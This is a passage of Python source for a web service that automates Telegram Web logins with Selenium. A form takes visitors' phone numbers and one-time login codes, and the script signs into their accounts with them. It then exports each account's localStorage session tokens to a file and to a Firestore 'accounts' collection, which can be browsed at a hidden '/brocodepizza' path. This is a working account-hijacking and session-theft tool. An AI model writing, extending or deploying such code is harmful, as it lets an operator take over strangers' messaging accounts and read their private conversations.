                        f.write(self.driver.page_source)
                    raise Exception("Could not find login button")
            
            # Wait for form elements
            time.sleep(3)
            log.info("Waiting for country dropdown...")
            
            # Click on country dropdown to open it
            country_dropdown = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "div.CountryCodeInput"))
            )
            log.info("Country dropdown found, clicking...")
            country_dropdown.click()
            log.info("Country dropdown clicked")
            
            time.sleep(2)
            log.info("Searching for country input...")
            
            # Search for country in the dropdown
            search_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input#sign-in-phone-code"))
            )
            search_input.clear()
            log.info("Country search input found and cleared")
            
            # Get country name from country code
            country_name = self.get_country_name(country_code)
            search_input.send_keys(country_name)
            log.info(f"Searched for country: {country_name}")
            
            time.sleep(2)
            log.info("Looking for country option in dropdown...")
            
            # Select country from the dropdown
            country_option = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, f"//div[contains(@class, 'MenuItem')]//span[contains(text(), '{country_name}')]"))
            )
            log.info(f"Country option found: {country_name}")
            country_option.click()
            log.info(f"{country_name} selected from dropdown")
            
            time.sleep(2)
            log.info("Waiting for phone number input...")
            
            # Enter the phone number
            phone_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input#sign-in-phone-number'))
            )
            log.info("Phone number input found")

            phone_input.send_keys(phone_number)
            log.info(f"Phone number entered: {phone_number}")
            
            # Click Next button
            time.sleep(2)
            log.info("Looking for Next button...")
            next_button_selectors = [
                "//button[contains(text(), 'Next')]",
                "//button[contains(@class, 'auth-button') and contains(@class, 'primary')]",
                "//button[@type='submit']",
                "button.Button.auth-button.default.primary"
            ]
            
            next_button = None
            for idx, selector in enumerate(next_button_selectors):
                try:
                    log.info(f"Trying Next button selector {idx}: {selector}")
                    if selector.startswith('//'):
                        next_button = self.driver.find_element(By.XPATH, selector)
                    else:
                        next_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    
                    if next_button.is_enabled():
                        log.info(f"Next button found with selector {idx}, clicking...")
                        next_button.click()
                        log.info("Next button clicked")
                        break
                    else:
                        next_button = None
                        log.info(f"Next button found but disabled")
                except Exception as e:
                    log.info(f"Next button selector {idx} failed: {str(e)}")
                    continue
            
            if not next_button:
                log.info("Next button not found with standard selectors, trying JavaScript click...")
                # Fallback: try JavaScript click
                buttons = self.driver.find_elements(By.CSS_SELECTOR, "button.primary")
                log.info(f"Found {len(buttons)} buttons with class 'primary'")
                for i, button in enumerate(buttons):
                    if button.is_displayed():
                        log.info(f"Clicking button {i} using JavaScript")
                        self.driver.execute_script("arguments[0].click();", button)
                        log.info("Clicked button using JavaScript")
                        break
            
            log.info("Phone login step completed, code should be required now")
            self.current_status = "code_required"
            return True
            
        except Exception as e:
            log.error(f"Error during phone login: {e}")
            log.error(f"Exception type: {type(e).__name__}")
            import traceback
            log.error(f"Traceback: {traceback.format_exc()}")
            self.current_status = f"error: {str(e)}"
            # Save error details
            try:
                self.driver.save_screenshot('telegram_error.png')
                log.info("Screenshot saved to telegram_error.png")
                with open('telegram_error_source.html', 'w', encoding='utf-8') as f:
                    f.write(self.driver.page_source)
                log.info("Error page source saved to telegram_error_source.html")
            except Exception:
                pass
            return False
    # ...existing code...
    def get_country_name(self, country_code):
        """Get country name from country code"""
        country_map = {
            "251": "Ethiopia",
            "1": "United States",
            "44": "United Kingdom",
            "91": "India",
            "86": "China",
            "49": "Germany",
            "33": "France",
            "39": "Italy",
            "34": "Spain",
            "7": "Russia",
            "81": "Japan",
            "82": "South Korea",
        }
        return country_map.get(country_code, "Ethiopia")
    # ...existing code...
    def enter_login_code(self, code):
        """Enter the login code received from user"""
        try:
            log.info(f"Starting code entry for code: {code}")
            # Wait for code input page
            code_input = WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.ID, "sign-in-code"))
            )
            log.info("Code input field found")
            
            code_input.send_keys(code)
            log.info(f"Code submitted: {code}")
            
            # Wait for successful login
            log.info("Waiting for chat list to appear (login confirmation)...")
            WebDriverWait(self.driver, 30).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '.chat-list, .dialogs, .conversation-list'))
            )
            log.info("Login successful! Chat list found")
            
            # Export LocalStorage
            log.info("Exporting LocalStorage...")
            local_storage_data = self.driver.execute_script("return Object.assign({}, localStorage);")
            log.info(f"LocalStorage exported, size: {len(str(local_storage_data))} bytes")
            
            with open('telegram_localstorage_headless.json', 'w') as f:
                json.dump(local_storage_data, f, indent=2)
            log.info("LocalStorage saved to telegram_localstorage_headless.json")

            try:
                if firestore_db:
                    log.info("Saving to Firestore...")
                    doc = {
                        "phone_number": getattr(self, "phone_number", "unknown"),
                        "local_storage": local_storage_data,
                        "created_at": firestore.SERVER_TIMESTAMP
                    }
                    firestore_db.collection("accounts").add(doc)
                    log.info("LocalStorage saved to Firestore collection 'accounts'")
                else:
                    log.warning("Firestore not initialized; skipped saving localStorage to Firestore")
            except Exception as e:
                log.error(f"Failed to save to Firestore: {e}")
            
            self.current_status = "login_success"
            log.info("Code entry completed successfully")
            return True
            
        except Exception as e:
            log.error(f"Error during code entry: {e}")
            log.error(f"Exception type: {type(e).__name__}")
            import traceback
            log.error(f"Traceback: {traceback.format_exc()}")
            self.current_status = f"error: {str(e)}"
            return False

    def close(self):
        """Close the WebDriver"""
        if self.driver:
            try:
                log.info("Closing WebDriver...")
                self.driver.quit()
                log.info("WebDriver closed successfully")
            except Exception as e:
                log.error(f"Error closing WebDriver: {e}")
            log.info("WebDriver closed")

# Global automation instance (deprecated - kept for backwards compatibility if needed)
automation = None

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class TelegramHTTPHandler(BaseHTTPRequestHandler):
    def _set_common_headers(self):
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Session-Id')

    def _is_authorized(self):
        """Check HTTP Basic Authorization header against ADMIN_USER / ADMIN_PASS.
        If ADMIN_USER/ADMIN_PASS are not set, treat as allowed (developer convenience)."""
        if not (ADMIN_USER and ADMIN_PASS):
            return True  # no creds configured -> allow access (use env vars in production)
        auth = self.headers.get('Authorization')
        if not auth or not auth.lower().startswith('basic '):
            return False
        try:
            token = auth.split(None, 1)[1]
            decoded = base64.b64decode(token).decode('utf-8')
            user, pwd = decoded.split(':', 1)
            return user == ADMIN_USER and pwd == ADMIN_PASS
        except Exception:
            return False

    def _require_auth(self):
        """Send 401 WWW-Authenticate response"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Restricted"')
        self._set_common_headers()
        self.end_headers()
        self.wfile.write(json.dumps({"error": "authentication_required"}).encode())
    # ...existing code...

    def do_GET(self):
        """Handle GET requests"""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)
        session_id = query.get('session', [None])[0] or self.headers.get('X-Session-Id')
        
        log.info(f"GET request: path={path}, session_id={session_id}")

        if path == '/status':
            # If session supplied, return that session's status
            if session_id:
                with sessions_lock:
                    sess = sessions.get(session_id)
                if not sess:
                    log.warning(f"Session {session_id} not found")
                    self.send_response(404)
                    self._set_common_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": "session_not_found"}).encode())
                    return
                status = sess.get('status', 'unknown')
            else:
                status = automation.current_status if automation else "not_initialized"

            log.info(f"Returning status: {status}")
            self.send_response(200)
            self._set_common_headers()
            self.end_headers()
            self.wfile.write(json.dumps({"status": status}).encode())
            return
        
        elif path == '/':
            # Serve form.html
            log.info("Serving form.html")
            try:
                with open('form.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")
        
        elif path == '/brocodepizza':
            # Serve home.html
            if not self._is_authorized():
                return self._require_auth()
            try:
                with open('home.html', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_error(404, "File not found")
        
        elif path == '/brocodepizza':
            # Fetch accounts from Firestore
            if not firestore_db:
                self.send_response(500)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Firestore not initialized"}).encode())
                return
            
            try:
                accounts_ref = firestore_db.collection("accounts")
                docs = accounts_ref.stream()
                accounts = []
                for doc in docs:
                    data = doc.to_dict()
                    # Convert timestamp to ISO string if present
                    if 'created_at' in data and data['created_at']:
                        data['created_at'] = data['created_at'].isoformat()
                    accounts.append(data)
                
                self.send_response(200)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps(accounts).encode())
            except Exception as e:
                self.send_response(500)
                self._set_common_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        
        else:
            self.send_error(404, "Endpoint not found")
    
    def do_POST(self):
        """Handle POST requests for phone number and code"""
        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        
        log.info(f"POST request: path={self.path}, content_length={content_length}")
        
        # Read the POST data
        if content_length > 0:
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                log.info(f"POST data received: {list(data.keys())}")
            except Exception as e:
                log.error(f"Failed to parse POST data: {e}")
                data = {}
        else:
            data = {}
        
        self.send_response(200)
        self._set_common_headers()
        self.end_headers()
        
        global automation
        
        if self.path == '/phone':
            country_code = data.get('country_code', '')
            phone_number = data.get('phone_number', '')
            
            log.info(f"Phone login request: country={country_code}, phone={phone_number}")
            
            if not country_code or not phone_number:
                log.warning(f"Missing country_code or phone_number")
                response = {"error": "Missing country_code or phone_number"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            # create session record but DO NOT start browser here (avoid multiple browsers)
            session_id = uuid.uuid4().hex
            now = time.time()
            sess = {
                "created_at": now,
                "queued_at": now,
                "phone_country": country_code,
                "phone_number": phone_number,
                "status": "queued",
                "automation": None,      # will be created by processor when job is active
                "pending_code": None
            }
            with sessions_lock:
                sessions[session_id] = sess
            with queue_lock:
                job_queue.append(session_id)

            log.info(f"Session {session_id} created and queued")
            response = {"message": "Enqueued. You will be processed when previous jobs finish.", "session": session_id, "position": len(job_queue)}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
        
        elif self.path == '/code':
            session_id = data.get('session') or self.headers.get('X-Session-Id')
            log.info(f"Code submission for session: {session_id}")
            
            if not session_id:
                log.warning(f"Missing session id")
                response = {"error": "Missing session id. Include 'session' in JSON body or 'X-Session-Id' header."}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            with sessions_lock:
                sess = sessions.get(session_id)
            if not sess:
                log.warning(f"Session {session_id} not found")
                response = {"error": "session_not_found"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            code = data.get('code', '')
            if not code:
                log.warning(f"Missing code")
                response = {"error": "Missing code"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            # Store pending code so the processor can use it when this session is active.
            log.info(f"Storing code for session {session_id}")
            with sessions_lock:
                sess['pending_code'] = code
                # If job is still queued, mark that code arrived (so processor won't wait full CODE_WAIT)
                if sess.get('status') == 'queued':
                    sess['status'] = 'queued_with_code'
            response = {"message": "Code received and stored for session."}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
        
        else:
            log.info(f"Unknown POST path: {self.path}")
            response = {"error": "Invalid endpoint"}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            return
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self._set_common_headers()
        self.end_headers()
    
    def log_message(self, format, *args):
        """Route the stdlib HTTP access log into our logger.

        Kept at DEBUG so Render's log stream stays readable at the default
        INFO level; export LOG_LEVEL=DEBUG to see every request line.
        """
        log.debug("%s - %s", self.address_string(), format % args)

def _session_cleaner():
    """Background cleaner to remove old sessions and close browsers"""
    log.info("Session cleaner started")
    while True:
        with sessions_lock:
            now = time.time()
            to_delete = []
            for sid, val in list(sessions.items()):
                # If an explicit expires_at was set (post-login), use it
                expires = val.get('expires_at')
                if expires:
                    if now > expires:
                        log.info(f"Session {sid} expired, marking for deletion")
                        to_delete.append(sid)
                    continue

                # Otherwise fall back to queued/created age
                age = now - val.get('created_at', now)
                # be defensive: automation may be None or already closed
                auto = val.get('automation')
                status = None
                try:
                    if auto:
                        status = getattr(auto, 'current_status', None)
                except Exception:
                    status = None

                if age > QUEUED_TTL:
                    log.info(f"Session {sid} exceeded QUEUED_TTL ({QUEUED_TTL}s), marking for deletion")
                    to_delete.append(sid)
                elif status == "login_success" and age > SESSION_TTL:
                    log.info(f"Session {sid} exceeded SESSION_TTL ({SESSION_TTL}s), marking for deletion")
                    to_delete.append(sid)
                elif isinstance(status, str) and status.startswith("error:") and age > 600:
                    log.info(f"Session {sid} is in error state and exceeded 600s, marking for deletion")
                    to_delete.append(sid)

            for sid in to_delete:
                try:
                    auto = sessions[sid].get('automation')
                    if auto:
                        auto.close()
                except Exception:
                    pass
                # Optionally remove any on-disk files tied to session here (if you save per-session localStorage)
                sessions.pop(sid, None)
                log.info(f"Session {sid} deleted")
        time.sleep(30)


def _queue_processor():
    """Sequentially process queued sessions. Only one browser runs at a time."""
    log.info("Queue processor started")
    while True:
        session_id = None
        with queue_lock:
            if job_queue:
                session_id = job_queue.popleft()
        if not session_id:
            time.sleep(1)
            continue

        log.info(f"Processing session: {session_id}")
        with sessions_lock:
            sess = sessions.get(session_id)
            if not sess:
                log.warning(f"Session {session_id} not found, skipping")
                continue
            sess['status'] = 'processing'
            sess['started_at'] = time.time()
            log.info(f"Session {session_id} status changed to 'processing'")

        # Create automation instance here (only one at a time)
        try:
            log.info(f"Creating TelegramAutomation instance for session {session_id}...")
            auto = TelegramAutomation()
            log.info(f"TelegramAutomation instance created successfully")
        except Exception as e:
            log.error(f"Failed to create TelegramAutomation for session {session_id}: {e}")
            with sessions_lock:
                sess['status'] = f"error: failed_to_start_browser: {e}"
                sess['automation'] = None
            continue

        with sessions_lock:
            sess['automation'] = auto

        # Run login_with_phone in thread to allow applying timeout
        log.info(f"Starting login thread for session {session_id}...")
        login_thread = threading.Thread(target=lambda: auto.login_with_phone(sess['phone_country'], sess['phone_number']))
        login_thread.daemon = True
        login_thread.start()
        login_thread.join(LOGIN_TIMEOUT)

        with sessions_lock:
            status = auto.current_status

        log.info(f"Login thread completed for session {session_id}, status: {status}")

        if login_thread.is_alive():
            # login step timed out / stuck
            log.info(f"Login thread timed out for session {session_id} after {LOGIN_TIMEOUT}s")
            try:
                auto.current_status = f"error: login_timeout_after_{LOGIN_TIMEOUT}s"
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['automation'] = None
            continue

        # If login failed quickly, mark error and continue
        if status.startswith("error:"):
            log.warning(f"Login failed for session {session_id}: {status}")
            with sessions_lock:
                sess['status'] = status
                sess['automation'] = None
            try:
                auto.close()
            except Exception:
                pass
            continue

        # If code is required, wait for user code (but not indefinitely)
        if status == "code_required":
            log.info(f"Code required for session {session_id}, waiting for user input...")
            with sessions_lock:
                sess['status'] = 'code_required'
            code_deadline = time.time() + CODE_WAIT
            got_code = False
            while time.time() < code_deadline:
                with sessions_lock:
                    code = sess.get('pending_code')
                if code:
                    log.info(f"Code received for session {session_id}: {code}")
                    got_code = True
                    break
                time.sleep(1)

            if not got_code:
                # no code provided in time
                log.info(f"No code received for session {session_id} within {CODE_WAIT}s")
                try:
                    auto.current_status = f"error: no_code_received_within_{CODE_WAIT}s"
                    auto.close()
                except Exception:
                    pass
                with sessions_lock:
                    sess['status'] = auto.current_status
                    sess['automation'] = None
                continue

            # run enter_login_code with timeout
            def _enter_code(a, c):
                a.enter_login_code(c)

            log.info(f"Starting code entry thread for session {session_id}...")
            code_thread = threading.Thread(target=_enter_code, args=(auto, code))
            code_thread.daemon = True
            code_thread.start()
            code_thread.join(CODE_ENTRY_TIMEOUT)

            log.info(f"Code entry thread completed for session {session_id}")

            if code_thread.is_alive():
                log.info(f"Code entry thread timed out for session {session_id} after {CODE_ENTRY_TIMEOUT}s")
                try:
                    auto.current_status = f"error: code_entry_timeout_after_{CODE_ENTRY_TIMEOUT}s"
                    auto.close()
                except Exception:
                    pass
                with sessions_lock:
                    sess['status'] = auto.current_status
                    sess['automation'] = None
                    sess['pending_code'] = None
                continue

            # finished code step; capture final status and cleanup as needed
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['pending_code'] = None
                if auto.current_status == "login_success":
                    sess['expires_at'] = time.time() + SESSION_TTL
                    log.info(f"Session {session_id} logged in successfully")
                else:
                    log.warning(f"Session {session_id} code entry failed: {auto.current_status}")

            # If login_success, leave local storage saving logic inside enter_login_code (already present)
            try:
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['automation'] = None

        else:
            # unexpected status - close and mark
            log.info(f"Unexpected status for session {session_id}: {status}")
            try:
                auto.current_status = f"error: unexpected_status_{status}"
                auto.close()
            except Exception:
                pass
            with sessions_lock:
                sess['status'] = auto.current_status
                sess['automation'] = None


def run_server():
    port = int(os.environ.get('PORT', 8765))
    log_startup_banner(log)
    existing_chrome = find_chrome_binary()
    if existing_chrome:
        log.info(f"Chrome binary detected: {existing_chrome}")
    else:
        log.info(f"Chrome binary not found; will auto-install to {CHROME_INSTALL_DIR} "
                 f"(AUTO_INSTALL_CHROME={'on' if AUTO_INSTALL_CHROME else 'off'})")
    server = ThreadedHTTPServer(('0.0.0.0', port), TelegramHTTPHandler)
    log.info(f"HTTP server started on 0.0.0.0:{port} (threaded)")
    # start session cleaner
    cleaner = threading.Thread(target=_session_cleaner, daemon=True)
    cleaner.start()
    log.info("Session cleaner thread started")
    # start queue processor (single worker)
    processor = threading.Thread(target=_queue_processor, daemon=True)
    processor.start()
    log.info("Queue processor thread started (single active automation)")

    # Warm up Chrome (download browser + unpack system libraries) in the
    # background so the first user request is fast and provisioning problems
    # surface in the deploy logs right away. Disable with WARMUP_BROWSER=0.
    if os.environ.get('WARMUP_BROWSER', '1').strip().lower() not in ('0', 'false', 'no', 'off'):
        warm = threading.Thread(target=_warm_up_browser, daemon=True, name='_browser_warmup')
        warm.start()
        log.info("Browser warm-up thread started (WARMUP_BROWSER=0 to disable)")

    # Render (and most PaaS platforms) send SIGTERM when a service is stopped or
    # redeployed. Turn it into the same graceful-shutdown path as Ctrl+C so open
    # browsers are closed and the stop shows up cleanly in the log stream.
    def _handle_stop_signal(signum, _frame):
        log.warning(f"Received SIGTERM (signal {signum}); shutting down gracefully")
        raise KeyboardInterrupt

    try:
        signal.signal(signal.SIGTERM, _handle_stop_signal)
    except (ValueError, OSError):
        # Not running in the main thread, or signals unsupported here.
        pass

    log.info("Press Ctrl+C to stop the server")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("Shutting down server...")
        # close all sessions' browsers
        with sessions_lock:
            for sid, val in sessions.items():
                try:
                    if val.get('automation'):
                        val['automation'].close()
                except Exception:
                    pass
        server.server_close()
        log.info("Server shut down complete")

if __name__ == "__main__":
    run_server()
# ...existing code...